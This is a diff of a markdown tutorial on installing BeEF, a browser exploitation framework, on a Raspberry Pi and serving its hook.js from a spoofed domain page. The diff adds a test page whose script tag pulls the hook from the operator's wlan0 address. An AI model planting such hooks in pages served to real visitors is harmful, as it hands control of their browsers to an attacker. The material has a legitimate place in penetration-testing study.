@@ -6,6 +6,12 @@ BeEF (_Browser Exploitation Framework_) is a penetration tool focused on exploit
 
 The aim of this tutorial is to set up BeEF on Raspberry PI and to show you where you could place the `hook.js`.
 
+- [Setup Raspberry PI](../Setup)
+- [Prepare Raspberry PI](../Preparation)
+- [Simple Access Point](../AccessPoint)
+- [DNS Analysis](../DNSAnalysis)
+- [DNS Redirection](../DNSRedirection)
+
 ## Install needed and/or optional packages
 
 Install (_or ensure they are installed_) following packages.
@@ -21,7 +27,9 @@ $ sudo apt install -y vim
 $ sudo apt install -y ruby-full curl git build-essential openssl libreadline6-dev zlib1g zlib1g-dev libssl-dev libyaml-dev libsqlite3-0 libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev autoconf libc6-dev libncurses5-dev automake libtool bison nodejs libcurl4-openssl-dev
 ```
 
-## Install BeEF
+## BeEF
+
+### Install BeEF
 
 ```shell
 # changer into home directory
@@ -49,7 +57,7 @@ if [ "${Distro}" = "Debian" ] || [ "${Distro}" = "Kali" ]; then
 
 To save a lot of time, you can add `--no-document` into command `sudo gem${RUBYSUFFIX} update --system` on line 205.
 
-## BeEF configuration
+### Configure BeEF
 
 Just change username and password on `/home/pi/beef/config.yaml`.
 
@@ -60,14 +68,20 @@ $ vim config.yaml
 
 Read this [Wiki](https://github.com/beefproject/beef/wiki/Configuration) for more information's.
 
-## Start BeEF
+### Start BeEF
 
 ```shell
 # start BeEF
 $ ./beef
 ```
 
-## Prepare the spoofed domain page
+Open in your browser the URL `http://192.168.0.1:3000/ui/panel` and login with your credentials (_you have modified in the config.yaml_).
+
+_Note: If you follow the output inside the terminal, you will see that some other packages are required. Install them if you need them (maybe in second terminal session) and execute the BeEF command again (inside the Browser UI)._
+
+## Prepare the spoofed domain web page
+
+Now we place the `hook.js` inside the fake page.
 
 Content of file `/var/www/html/index.html`.
 
@@ -94,9 +108,23 @@ Content of file `/var/www/html/index.html`.
 </html>
 ```
 
-Finally, open in your browser the URL `http://192.168.0.1:3000/ui/panel` and login with your credentials (_you have modified in the config.yaml_).
+### Test BeEF local
 
-_Note: If you follow the output inside the terminal, you will see that some other packages are required. Install them if you need them (maybe in second terminal session) and execute the BeEF command again._
+You can also test BeEF locally, but be careful!
+
+```html
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>local test of BeEF</title>
+</head>
+<body>
+  <p>This is my local test site...</p>
+<script src="http://[your ip of wlan0 interface]:3000/hook.js"></script>
+</body>
+</html>
+```
 
 ## Additional
 
